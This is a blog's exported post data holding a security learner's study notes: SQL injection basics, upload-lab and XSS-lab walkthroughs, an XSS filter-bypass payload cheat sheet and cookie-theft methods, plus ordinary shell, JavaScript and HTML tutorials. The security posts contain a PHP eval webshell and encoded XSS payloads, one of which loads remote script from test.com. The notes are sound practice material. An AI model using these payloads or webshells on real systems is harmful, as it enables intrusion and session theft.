{"meta":{"title":"xdzjldy","subtitle":"弃燕雀之小志，慕鸿鹄以高翔","description":"弃燕雀之小志，慕鸿鹄以高翔","author":"xdzjldy","url":"https://xdzjldy.github.io","root":"/"},"pages":[{"title":"","date":"2024-10-11T05:15:19.294Z","updated":"2024-10-11T05:15:19.294Z","comments":true,"path":"categories/index.html","permalink":"https://xdzjldy.github.io/categories/index.html","excerpt":"","text":"title:分類date:2018-01-05 00:00:00type:’categories’"},{"title":"友情鏈接","date":"2018-06-07T14:17:49.000Z","updated":"2024-10-11T06:57:43.697Z","comments":true,"path":"link/index.html","permalink":"https://xdzjldy.github.io/link/index.html","excerpt":"","text":""},{"title":"","date":"2024-10-11T05:09:38.154Z","updated":"2024-10-11T05:09:38.154Z","comments":true,"path":"tags/index.html","permalink":"https://xdzjldy.github.io/tags/index.html","excerpt":"","text":"​—title:標籤date:2018-01-05 00:00:00type:’tags’orderby:randomorder:1​—"}],"posts":[{"title":"SQL绕过","slug":"SQL绕过","date":"2025-01-24T10:53:11.000Z","updated":"2025-01-24T10:57:02.981Z","comments":true,"path":"2025/01/24/SQL绕过/","permalink":"https://xdzjldy.github.io/2025/01/24/SQL%E7%BB%95%E8%BF%87/","excerpt":"","text":"漏洞的类型普通查询注入判断漏洞是否存在数字型例如后端SQL语句： select * from article where artid = 1 and xxxxx; 可以在参数值后面输入单引号，此时数据库无法执行就会报错，说明存在SQL注入 ?id&#x3D;1’ #select * from article where id &#x3D; 1’ and xxxx; 通过and 1&#x3D;1 ，and 1&#x3D;2 判断 ?id&#x3D;1 and 1&#x3D;1?id&#x3D;2 and 1&#x3D;2 #select * from article where id &#x3D; 1 and 1&#x3D;1 and xxxx; #若and 1&#x3D;1页面回显正常，and 1&#x3D;2 回显不正常 ，则说明拼接成功 注意：在测试删除功能时尽量不要使用and 1=1，否则可能会将数据全部删除 字符型与数字型类似，注意单引号&#x2F;双引号&#x2F;括号的闭合，可以在最后加上注释符把后面的闭合符号和语句直接注释掉 判断字段数?id&#x3D;1 order by 4 # 遍历数字，页面内容回显正常说明列数正确 order by 无法使用时，可以通过SELECT NULL判断 ?id&#x3D;1 SELECT NULL, NULL, NULL, NULL","categories":[],"tags":[]},{"title":"SQL注入漏洞","slug":"SQL注入漏洞","date":"2025-01-24T10:36:35.000Z","updated":"2025-01-24T10:56:24.814Z","comments":true,"path":"2025/01/24/SQL注入漏洞/","permalink":"https://xdzjldy.github.io/2025/01/24/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"SQL注入漏洞1.原理：1参数用户可控：前端传给后端的参数内容是用户可以控制的。 2参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询。 2.基础SQL语句：select column_name from tables_name 在表tables_name中查询字段column_name select column_name from tables_name where 已知字段名&#x3D;已知的条件 在已知的条件下，在表tables_name中查询字段column_name 3.information_schemaMySQL 5.0版本之后，MySQL默认在数据库中存放一个“information_schema”的数据库，在该库中，需要记住三个表名，分别是：schemata、tables、columns。 1.schemata表存储该用户创建的所有数据库的库名。 数据库库名的字段名为：schemata_name 2.tables表存储该用户创建的所有数据库的库名和表名。 数据库库名和表名的字段名分别是：tables_schema和table_name。 3.columns表存储该用户创建的所有数据库的库名、表名和字段名。 数据库库名、表名和字段名的字段名分别是：tables_schema、table_name和column_name。 information_schema.tables：数据库的表名 information_schema.columns：数据库的列名 4.limit的用法limit子句是用于限制查询结果返回的数量，常用于分页查询。也就是SQL查询出来的结果集，按照升序排列，由小到大排列。 语法：limit m，n 参数：m：是指记录开始的位置，从0开始，表示第一条记录 ​ n：是指取n条记录 例如：limit 0,1 的含义说就是表示从第一条记录开始，表示取最上面0到1之间的记录，即为第一条记录，取一条记录。 5.注释符：# …… ：#号后面的都会被注释 – …… ：–号后面的都会被注释，不过在 – 的前后都需要加空格再加数据 &#x2F;* … *&#x2F; ：内联注释，内联注释可以用于整个SQL语句中，用来执行SQL语句。 例如：index?id&#x3D;-10 &#x2F;!union&#x2F; &#x2F;!select&#x2F; 1,2,3","categories":[],"tags":[]},{"title":"文件上传漏洞靶场","slug":"文件上传漏洞靶场","date":"2025-01-22T15:06:03.000Z","updated":"2025-01-24T10:43:27.900Z","comments":true,"path":"2025/01/22/文件上传漏洞靶场/","permalink":"https://xdzjldy.github.io/2025/01/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"Pass-01) 前端检测 onsumbit=checkFile()：调用js函数来检查上传文件的扩展名。 &lt;?php@eval($_POST[&#39;cmd&#39;]);?&gt; 修改后缀名为jpg，burpsuit抓包改后缀名改为php。 Pass-02后端检测 做法同Pass-01 Pass-03黑名单限制 burpsuit抓包改后缀名改为phtml。 Pass-04黑名单限制大部分后缀 .htaccess文件（分布式配置文件）：提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。 创建一个.hatacess文件上传 AddType application&#x2F;x-httpd-php .jpg 无论什么文件只要包含了jpg都视为php来解析 在上传带有一句话木马的jpg文件 Pass-05 法一：在php后面加上“。。” 法二：.user.ini文件：php.ini是php的全局配置文件，对整个web服务起作用，.user.ini和.htaccess都是目录的配置文件，.user.ini是用户自定义的php.ini。 在.user.ini中写入auto_prepend_file=attack.png Pass-06 大小写绕过 Pass-07 空格绕过","categories":[],"tags":[]},{"title":"xss-lab","slug":"xss-lab","date":"2025-01-22T15:05:26.000Z","updated":"2025-01-24T10:57:42.992Z","comments":true,"path":"2025/01/22/xss-lab/","permalink":"https://xdzjldy.github.io/2025/01/22/xss-lab/","excerpt":"","text":"xsslevel 1url?name=&lt;script&gt;alert()&lt;/script&gt; level 2alert() 闭合双引号 “&gt;alert()&lt;” level 3alert() ‘ onfocus&#x3D;javascript:alert() ‘ 再点击输入框 level 4 “ onfocus&#x3D;javascript:alert() “ 再点击输入框 level 5 &quot;&gt;&lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot; level 6“&gt;alert()&lt;” 大小写绕过 “&gt;alert()&lt;”level 7“&gt;alert()&lt;” 发现过滤script 双写 “&gt;alert()&lt;” level 8 ![image-20241225184352554](C:\\Users\\xdzjl\\AppData\\Roaming\\Typora\\image\\屏幕截图 2024-12-25 184338.png) 发现script被过滤 尝试 对javascript:alert()unicode编码 &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41; level 9&lt;script&gt;alert()&lt;/script&gt; ![](C:\\Users\\xdzjl\\AppData\\Roaming\\Typora\\image\\屏幕截图 2024-12-25 185027.png) 提示链接不合法 “&gt;&lt;http://javascript:alert()&lt;” ![](C:\\Users\\xdzjl\\AppData\\Roaming\\Typora\\image\\屏幕截图 2024-12-25 185332.png) 尝试unicode编码 发现链接不合法 http:&#x2F;&#x2F;链接合法 不用闭合前面和后面的双引号 编码javascript:alert()，然后加上&#x2F;*http:&#x2F;&#x2F; 无法弹窗 加上*/ 注释掉后续源码 1`&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/*http://*/` level 10![](C:\\Users\\xdzjl\\AppData\\Roaming\\Typora\\image\\屏幕截图 2024-12-25 190428.png) 发现只有t_sort可以传参 ?t_sort=&quot; onfocus =javascript:alert() type=&quot;text 其中type&#x3D;”text为了让输入框显示，而不是hidden ![](C:\\Users\\xdzjl\\AppData\\Roaming\\Typora\\image\\屏幕截图 2024-12-25 191303.png)","categories":[],"tags":[]},{"title":"xss绕过总结","slug":"xss绕过总结","date":"2025-01-22T14:46:01.000Z","updated":"2025-01-22T15:08:28.747Z","comments":true,"path":"2025/01/22/xss绕过总结/","permalink":"https://xdzjldy.github.io/2025/01/22/xss%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/","excerpt":"","text":"xss绕过总结一、xss 常见标签语句12345`&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;``&lt;img src=x onerror=&quot;alert(1)&quot;&gt;``&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;``&lt;svg onload=javascript:alert(1)&gt;``&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;` 二、xss 常见绕过1.编码绕过浏览器对 XSS 代码的解析顺序为：**HTML解码 —— URL解码 —— JS解码(只支持UNICODE)**。 1.html 实体编码当可控点为单个标签属性时，可以使用 html 实体编码。 1`&lt;a href=&quot;可控点&quot;&gt;test&lt;/a&gt;` 1`&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;` 十进制 1`&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;test&lt;/a&gt;` 十六进制 可以不带分号 可以填充0 2.url 编码当注入点存在 href 或者 src 属性时，可以使用 url 编码。 1`&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;` 注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。 1`&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;test&lt;/a&gt;` 可以二次编码 3.js 编码解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，例如 js 解析器工作的时候将\\u0061\\u006c\\u0065\\u0072\\u0074进行解码后为alert，而alert是一个有效的标识符名称，它是能被正常解析的。但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。 由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。 1`&lt;img src=x onerror=&quot;alert(1)&quot;&gt;` Unicode 编码 1`&lt;img src=x onerror=&quot;\\u0061\\u006c\\u0065\\u0072\\u0074(1)&quot;&gt;` 注：Unicode 编码时，只能对有效的标识符进行编码，否则非标识符解码后不能解析执行。例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 “1” 进行编码，框号编码后会被当成文本字符，不能执行。ascii 八进制和十六进制编码使用时需要 eval、setTimeout等函数传递变量，并且可以对整个传递参数进行编码。例如 eval(“alert(1)”)，可以对 “alert(1)” 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。 八进制和十六进制 setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。 语法：setTimeout(要执行的代码, 等待的毫秒数) 1`setTimeout(JavaScript 函数, 等待的毫秒数)` 1`&lt;svg/onload=setTimeout(&#x27;\\x61\\x6C\\x65\\x72\\x74\\x28\\x31\\x29&#x27;)&gt;` 4.混合编码由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。 12345678`1. 原代码&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;2. 对alert进行JS编码（unicode编码）&lt;a href=&quot;javascript:\\u0061\\u006c\\u0065\\u0072\\u0074(1)&quot;&gt;test&lt;/a&gt;3. 对href标签中的\\u0061\\u006c\\u0065\\u0072\\u0074进行URL编码&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)&quot;&gt;test&lt;/a&gt;4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)进行HTML编码：&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;test&lt;/a&gt;` 注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。 5.base64 编码base64 编码通常需要使用到 data 伪协议。 data 协议使用方法：data:资源类型;编码,内容 base64编码内容为 12`&lt;script&gt;alert(/xss/)&lt;/script&gt;``PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=` 通常与 base64 编码配合 data 协议的标签有 、、 123456`1.&lt;object&gt; 标签&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;2.&lt;a&gt; 标签&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt; （新版浏览器不支持）3.&lt;iframe&gt; 标签&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;` atob 函数 atob() 方法用于解码使用 base-64 编码的字符串。 语法：window.atob(encodedStr)(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串) 1`&lt;a href=javascript:eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;test&lt;/a&gt;` 6. ascii 编码2.空格过滤绕过&lt;html&gt;&lt;img**AA**src**AA**onerror**BB**=**BB**alert**CC**(1)**DD**&lt;/html&gt; A位置可填充 &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20 B位置可填充 %09，%0A，%0C，%0D，%20 C位置可填充 %0B，&#x2F;**&#x2F;，如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20 D位置可填充 %09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt; 3.圆括号过滤绕过1.反引号替换2.throw 绕过12`&lt;video src onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;``&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\\x281\\x29&#x27;;&quot;&gt;` 4.单引号过滤绕过1.斜杠替换2.反引号替换5.alert 过滤绕过1.prompt,confirm,console.log,document.write替换2.base64 绕过6.关键词置空绕过1.大小写绕过2.嵌套绕过7.函数拼接1.eval,top,window,self,parent,frames1`&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(1)&#x27;)&quot;&gt;` 2.常用函数1`&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;` 8.赋值拼接1`&lt;img src onerror=_=alert,_(1)&gt;` 9.拆分法12345`&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;``&lt;script&gt;a=a+&#x27;&lt;script src=ht&#x27;&lt;/script&gt;``&lt;script&gt;a=a+&#x27;tp://test.com/xs&#x27;&lt;/script&gt;``&lt;script&gt;a=a+&#x27;s.js&gt;&lt;/script&gt;&quot;)&#x27;&lt;/script&gt;``&lt;script&gt;eval(a)&lt;/script&gt;` 通过上面的拆分法可以拼凑出下面完整的攻击向量： 1`document.write(&quot;&lt;script src = http://test.com/xss.js&gt;&lt;/script&gt;&quot;)`","categories":[],"tags":[]},{"title":"xss攻击的分类","slug":"xss攻击的分类","date":"2025-01-22T14:45:01.000Z","updated":"2025-01-22T14:47:29.646Z","comments":true,"path":"2025/01/22/xss攻击的分类/","permalink":"https://xdzjldy.github.io/2025/01/22/xss%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E7%B1%BB/","excerpt":"","text":"XSS攻击的分类（1）来自内部的攻击利用程序自身的漏洞，构造跨站语句 （2）来自外部的攻击自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。XSS的分类1、反射型(非持久化)：用户点击链接触发。（1）原理攻击者向服务器端注入一段js代码，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。当用户浏览该页面时，嵌入Web里面的Script代码就会被执行。（2）判断是否存在反射型xss漏洞并利用① 判断有没有过滤一些特殊的字符比如对比输出的字符和输出的字符② 注入代码假如我输入的是1，提交后，点击查看网页源代码③ 插入代码“&gt;&lt; img src&#x3D;1 onerror&#x3D;”alert(&#x2F;xss&#x2F;)”&#x2F;&gt; #如果读取图片失败，则用alert显示相关信息显示了信息，则说明存在xss注入④ 利用xss漏洞将刚刚成功注入代码并能触发xss的网址通过电子邮件等方式发送给对方的手中，如果结合xss平台，对方点击了链接，就能得到对方的cookie等信息2、存储型(持久化)（1）原理存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。（2）payload&lt; img src&#x3D;”1” onerror&#x3D;”alert(&#x2F;xss&#x2F;)”&#x2F;&gt;注入后重新刷新发现直接回显注入的东西，说明是存储型xss3、DOM型（1）原理文档对象模型（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行。基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出。（3）payload&lt; img src&#x3D;1 onerror&#x3D;”alert(&#x2F;xss&#x2F;)”&#x2F;&gt;XSS攻击的途径第一种：对普通的用户输入，页面原样输出，攻击者通过对JSCODE的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的Cookie.第二种：在代码区内存在有用户输入的内容第三种：允许用户输入HTML标签的页面，用户可以提交一些自定义的HTML代码。 Cookie 外带window.openwindow.open() 是 JavaScript 中用于打开新窗口或新标签页的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象window.open(“http://www.example.com“);最后相应的cookie以及内容弹回 fetch跨域请求中需要带有cookie时, 可在fetch方法的第二个参数对象中添加credentials属性, 并将值设置为”include”.fetch(url,{ credentials: ‘include’});需要目标服务器可以接受接受跨域发送cookies请求服务器端需要支持Access-Control-Allow-Credentials策略，并设置Access-Control-Allow-Credentials响应头为”true”， 即可允许跨域请求携带 Cookie。 XMLHttpRequestXMLHttpRequest发送请求时需要设置withCredentials属性为true,来允许浏览器在自己的域设置cookie值。后台设置Access-Control-Allow-Credentials，设置后必须写跟Request Headers的Origin相同的地址。","categories":[],"tags":[]},{"title":"","slug":"shell","date":"2024-10-11T03:58:37.939Z","updated":"2024-10-11T04:52:39.231Z","comments":true,"path":"2024/10/11/shell/","permalink":"https://xdzjldy.github.io/2024/10/11/shell/","excerpt":"","text":"shell脚本打开文本编辑器(可以使用 vi&#x2F;vim 命令来创建文件)，新建一个文件 test.sh，扩展名为 sh（sh代表shell），扩展名并不影响脚本执行，如果用 php 写 shell 脚本，扩展名就用 php 。#!/bin/bashecho “Hello World !”#! 是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。echo 命令用于向窗口输出文本。 运行 Shell 脚本有两种方法：1、作为可执行程序将上面的代码保存为 test.sh，并 cd 到相应目录：chmod +x ./test.sh #使脚本具有执行权限./test.sh #执行脚本要用 ./test.sh 告诉系统就在当前目录找。 2、作为解释器参数直接运行解释器，其参数就是 shell 脚本的文件名/bin/sh test.sh/bin/php test.php Shell 变量变量是用于存储数据值的名称。your_name&#x3D;”runoob” 使用变量在变量名前面加美元符号your_name&#x3D;”qinjx”echo $your_nameecho ${your_name}加花括号是为了帮助解释器识别变量的边界 只读变量readonly 命令 删除变量unset 命令不能删除只读变量。 变量类型字符串变量使用单引号 ‘ 或双引号 “ 来定义字符串 整数变量使用 declare 或 typeset 命令来声明整数变量 数组变量允许在一个变量中存储多个值数组可以是整数索引数组或关联数组 环境变量这些是由操作系统或用户设置的特殊变量，用于配置 Shell 的行为和影响其执行环境。 特殊变量有一些特殊变量在 Shell 中具有特殊含义例如 $0 表示脚本的名称，$1, $2, 等表示脚本的参数。$#表示传递给脚本的参数数量，$? 表示上一个命令的退出状态等。 Shell 字符串单引号单引号字符串的限制：单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的；单引号字符串中不能出现单独一个的单引号（对单引号使用转义符后也不行），但可成对出现，作为字符串拼接使用。 双引号双引号的优点：双引号里可以有变量双引号里可以出现转义字符 拼接字符串获取字符串长度提取子字符串string&#x3D;”runoob is a great site”echo ${string:1:4} # 输出 unoo 查找子字符串string&#x3D;”runoob is a great site” echo expr index &quot;$string&quot; io # 输出 4 Shell 传递参数脚本内获取参数的格式为 $n，n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数。$0 为执行的文件名（包含文件路径） Shell 数组bash支持一维数组（不支持多维数组），并且没有限定数组的大小。数组元素的下标由 0 开始编号。 定义数组用括号来表示数组，数组元素用”空格”符号分割开。数组名&#x3D;(值1 值2 … 值n)还可以单独定义数组的各个分量：array_name[0]&#x3D;value0array_name[1]&#x3D;value1array_name[n]&#x3D;valuen 读取数组$&#123;数组名[下标]&#125;使用 @ 符号可以获取数组中的所有元素：echo $&#123;array_name[@]&#125;在数组前加一个感叹号 ! 可以获取数组的所有键获取数组的长度 取得数组元素的个数length=$&#123;#array_name[@]&#125; 或者 length=$&#123;#array_name[*]&#125; 取得数组单个元素的长度length=$&#123;#array_name[n]&#125; 关联数组declare 命令declare -A array_name -A 选项就是用于声明一个关联数组。 访问关联数组元素可以使用指定的键： array_name[&quot;index&quot;] Shell 基本运算符Shell echo命令Shell printf 命令printf format-string [arguments...]format-string: 一个格式字符串，它包含普通文本和格式说明符。 arguments: 用于填充格式说明符的参数列表。 格式说明符由 % 字符开始，后跟一个或多个字符，用于指定输出的格式。 Shell test 命令Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。 Shell 流程控制&#96;ifif 语句语法格式：if conditionthen command1fi写成一行（适用于终端命令提示符）：if [ $(ps -ef | grep -c “ssh”) -gt 1 ]; then echo “true”; fi&#96; &#96;if elseif else 语法格式：if conditionthen command1else commandfi&#96; if else-if elseif else-if else 语法格式： if condition1 then command1 elif condition2 then command2 else commandN fi if else 的 [...] 判断语句中大于使用 -gt，小于使用 -lt。 if [ &quot;$a&quot; -gt &quot;$b&quot; ]; then ... fi 如果使用 ((...)) 作为判断语句，大于和小于可以直接使用 &gt; 和 &lt;。 if (( a &gt; b )); then ... fi for 循环for循环一般格式为: for var in item1 item2 ... itemN do command1 command2 ... commandN done 写成一行： for var in item1 item2 ... itemN; do command1; command2… done;","categories":[],"tags":[]},{"title":"","slug":"JavaScript","date":"2024-09-24T05:27:03.596Z","updated":"2024-09-27T14:27:36.821Z","comments":true,"path":"2024/09/24/JavaScript/","permalink":"https://xdzjldy.github.io/2024/09/24/JavaScript/","excerpt":"","text":"JavaScriptJavaScript 是一种脚本编程语言，它可以在网页上实现实时的内容更新。 直接写入 HTML 输出流:document.write(“&lt;h1&gt;这是一个标题&lt;/h1&gt;“); document.write(“&lt;p&gt;这是一个段落。&lt;/p&gt;“); 对事件的反应:&lt;button type=&quot;button&quot; onclick=&quot;alert(&#39;欢迎!&#39;)&quot;&gt;点我!&lt;/button&gt; 改变 HTML 内容:x&#x3D;document.getElementById(“demo”); &#x2F;&#x2F;查找元素x.innerHTML&#x3D;”Hello JavaScript”; &#x2F;&#x2F;改变内容 改变 HTML 图像: function changeImage() { element=document.getElementById('myimage') if (element.src.match(\"bulbon\")) { element.src=\"/images/pic_bulboff.gif\"; } else { element.src=\"/images/pic_bulbon.gif\"; } } &lt;img id=&quot;myimage&quot; onclick=&quot;changeImage()&quot; src=&quot;/images/pic_bulboff.gif&quot; width=&quot;100&quot; height=&quot;180&quot;&gt;element.src.match(“bulbon”) ：检索 &lt;img id=&quot;myimage&quot; onclick=&quot;changeImage()&quot; src=&quot;/images/pic_bulboff.gif&quot; width=&quot;100&quot; height=&quot;180&quot;&gt; 里面 src 属性的值有没有包含 bulbon 这个字符串，如果存在字符串 bulbon，图片 src 更新为 bulboff.gif，若匹配不到 bulbon 字符串，src 则更新为 bulbon.gif 改变 HTML 样式（属于改变 HTML 属性的变种）:x&#x3D;document.getElementById(“demo”) &#x2F;&#x2F;找到元素x.style.color&#x3D;”#ff0000”; &#x2F;&#x2F;改变样式 验证输入:if isNaN(x) { alert(“不是数字”);} JavaScript 用法HTML 中的 Javascript 脚本代码必须位于 与 标签之间。 Javascript 脚本代码可被放置在 HTML 页面的 和 部分中。 JavaScript 语法JavaScript 变量变量用于存储数据值。 使用关键字 var 来定义变量。 JavaScript 函数调用函数(执行函数内的语句)。 事件监听程序addEventListener() 方法element.addEventListener(event, function, useCapture);第一个参数是事件的类型（比如 “click” 或 “mousedown”）。第二个参数是当事件发生时我们需要调用的函数。第三个参数是布尔值，指定使用事件冒泡还是事件捕获。此参数是可选的。注意：请勿对事件使用 “on” 前缀；请使用 “click” 代替 “onclick”。 选取HTML元素1.getElementById(id): 通过元素的 id 属性来选中元素。var element &#x3D; document.getElementById(“要选的元素”);2.getElementsByClassName(name): 通过元素的 class 属性来选中元素。var elements &#x3D; document.getElementsByClassName(“要选的元素”);3.getElementsByTagName(name): 通过元素的标签名来选中元素。var elements &#x3D; document.getElementsByTagName(“元素的标签名”); 添加&#x2F;修改属性值使用 Object.defineProperty使用 Object.defineProperty() 函数可以为对象添加属性，或者修改现有属性。如果指定的属性名在对象中不存在，则执行添加操作；如果在对象中存在同名属性，则执行修改操作。Object.defineProperty(object, propertyname, descriptor);object：指定要添加或修改属性的对象，可以是 JavaScript 对象或者 DOM 对象。propertyname：表示属性名的字符串。descriptor：定义属性的描述符，包括对数据属性或访问器属性。 创建HTML标签Document.createElement()createElement(tagName) createElement(tagName, options) 添加属性setAttribute()element.setAttribute(attribute, value);element是要添加属性的HTML元素对象，attribute是要添加的属性名，value是要设置的属性值。将元素添加到DOM中parentElement.appendChild()","categories":[],"tags":[]},{"title":"","slug":"HTML","date":"2024-09-17T01:49:12.178Z","updated":"2024-09-27T15:34:43.502Z","comments":true,"path":"2024/09/17/HTML/","permalink":"https://xdzjldy.github.io/2024/09/17/HTML/","excerpt":"","text":"HTML超文本标记语言是一种用于创建网页的标准标记语言。可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。HTML 是用来描述网页的一种语言。HTML 是一种标记语言标记语言是一套标记标签HTML 使用标记标签来描述网页 HTML语法结构&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;我的第一个标题&lt;/h1&gt; &lt;p&gt;我的第一个段落。&lt;/p &gt; &lt;/body&gt;&lt;/html&gt; &lt;!DOCTYPE html&gt; 声明为 HTML5 文档&lt;html&gt; 元素是 HTML 页面的根元素 &lt;head&gt; 元素包含了文档的元（meta）数据，如 &lt;meta charset=&quot;utf-8&quot;&gt; 定义网页编码格式为 utf-8。 &lt;title&gt; 元素描述了文档的标题&lt;body&gt; 元素包含了可见的页面内容 &lt;h1&gt; 元素定义一个大标题 &lt;p&gt; 元素定义一个段落&lt;button&gt; 标签定义可点击的按钮&lt;input&gt;元素用于为基于 Web 的表单创建交互式控件，以便接受来自用户的数据&lt;div&gt;：内容划分元素&lt;img&gt; 标签用于在 HTML 页面中嵌入图像&lt;iframe&gt;表示嵌套的browsing context。它能够将另一个 HTML 页面嵌入到当前页面中&lt;a&gt; 标签定义超链接，用于从一张页面链接到另一张页面id 全局属性定义了一个全文档唯一的标识符从技术上讲，id 属性的值可以包含除了空白字符的任何字符。然而，为了避免无意中的错误，只能使用 ASCII 字母、数字、’_’ 和 ‘-‘，并且id 属性的值应该以字母开头。全局属性 class 的值是一个以空格分隔的元素的类名列表，它允许 CSS 和 Javascript 通过类选择器 或 DOM 方法来选择和访问特定的元素。尽管对 class 的命名没有要求，但 web 